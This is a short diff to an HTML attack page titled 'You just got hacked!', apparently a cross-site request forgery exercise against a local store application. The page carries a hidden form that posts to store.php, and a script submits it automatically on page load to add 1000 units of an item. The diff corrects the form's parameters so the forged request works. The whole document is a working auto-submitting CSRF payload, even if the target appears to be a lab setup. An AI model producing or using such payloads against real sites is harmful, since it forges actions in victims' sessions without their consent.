@@ -6,8 +6,9 @@
     <h1 align="center" > You just got hacked!</h1>
     <!-- create form which increases item with id=1 by 1000 units -->
     <form id=add method="post" action="https://localhost/store.php" target="xss1">
-      <input type="hidden" name="add" value=1>
-      <input type="hidden" name="itemIds" value=1000>
+      <input type="hidden" name="add">
+      <input type="hidden" name="itemIds" value=1>
+      <input type="hidden" name="quantity" value=1000>
     </form>
     <!--submits the form to store.php -->
     <script> document.getElementById("add").submit() </script>
